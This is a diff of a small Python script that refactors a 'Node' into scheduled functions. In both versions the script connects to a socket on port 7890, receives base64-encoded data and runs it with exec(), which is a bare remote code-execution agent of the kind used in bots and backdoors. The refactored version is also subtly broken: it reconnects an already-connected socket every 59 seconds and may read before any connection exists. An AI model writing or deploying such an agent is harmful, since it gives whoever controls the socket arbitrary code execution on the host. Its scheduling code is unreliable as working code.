@@ -1,30 +1,31 @@
-import socket
-from sys import exit
+import socket, schedule
+from time import sleep
 from base64 import b64decode
 
-class Node:
+node_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
-    def __init__(self):
-        self.node_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        self.node_socket.connect(("127.0.0.1", 7890))
-        self.start()
+def update():
+    node_socket.connect(("127.0.0.1", 7890))
 
-    def run(self, command):
-        try:
-            exec(b64decode(command))
-            return True
-        except Exception as error:
-            return False
+def run(command):
+    try:
+        exec(b64decode(command))
+        return True
+    except Exception as error:
+        return False
 
-    def start(self):
-        while True:
-            task = self.node_socket.recv(1024)
-            if self.run(task):
-                break
-            else:
-                pass
+def start():
+    task = node_socket.recv(1024)
+    if run(task):
+        pass
+    else:
+        pass
 
 if __name__ == "__main__":
-    node = Node()
-    node.start()
-    exit()
+    # Schedule tasks:
+    schedule.every(59).seconds.do(update)
+    schedule.every(1).minute.do(start)
+    while True:
+        # Do it:
+        schedule.run_pending()
+        sleep(0.1)
